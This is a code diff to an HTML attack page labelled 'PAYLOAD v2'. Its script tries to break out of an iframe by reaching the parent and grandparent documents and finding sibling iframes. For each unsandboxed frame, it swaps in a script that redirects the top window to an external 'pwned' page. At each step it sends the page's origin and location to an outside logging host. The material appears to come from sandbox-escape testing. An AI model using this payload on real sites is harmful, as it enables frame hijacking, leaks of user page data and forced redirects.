@@ -2,16 +2,22 @@
 <html>
 	<body>
 		<script>
+			// Beacon - this will show in your server logs
+			fetch("https://screenshotsart.store/log?event=payload_executed&origin=" + encodeURIComponent(window.origin) + "&location=" + encodeURIComponent(window.location.href));
+
 			console.log("=== PAYLOAD v2 ===");
+			console.log("Origin:", window.origin);
+			console.log("Location:", window.location.href);
 
 			// Try to access parent
 			try {
 				const parentDoc = window.parent.document;
 				console.log("🎯 PARENT DOM ACCESS WORKED!");
+				fetch("https://screenshotsart.store/log?event=parent_access_success");
 
-				// Find sibling iframes
 				const iframes = parentDoc.querySelectorAll("iframe");
 				console.log("Siblings:", iframes.length);
+				fetch("https://screenshotsart.store/log?event=found_iframes&count=" + iframes.length);
 
 				iframes.forEach((f, i) => {
 					const sandbox = f.getAttribute("sandbox");
@@ -19,17 +25,20 @@
 
 					if (!sandbox) {
 						console.log("  🔥 UNSANDBOXED! Hijacking...");
-						f.src = "https://screenshotsart.store/victory.html";
+						fetch("https://screenshotsart.store/log?event=hijacking_frame&index=" + i);
+						f.srcdoc = '<script>fetch("https://screenshotsart.store/log?event=victory");window.top.location="https://screenshotsart.store/pwned"<\/script>';
 					}
 				});
 			} catch (e) {
 				console.log("Parent access blocked:", e.message);
+				fetch("https://screenshotsart.store/log?event=parent_blocked&error=" + encodeURIComponent(e.message));
 			}
 
 			// Also try grandparent
 			try {
 				const gpDoc = window.parent.parent.document;
 				console.log("🎯 GRANDPARENT ACCESS WORKED!");
+				fetch("https://screenshotsart.store/log?event=grandparent_success");
 			} catch (e) {
 				console.log("Grandparent blocked:", e.message);
 			}
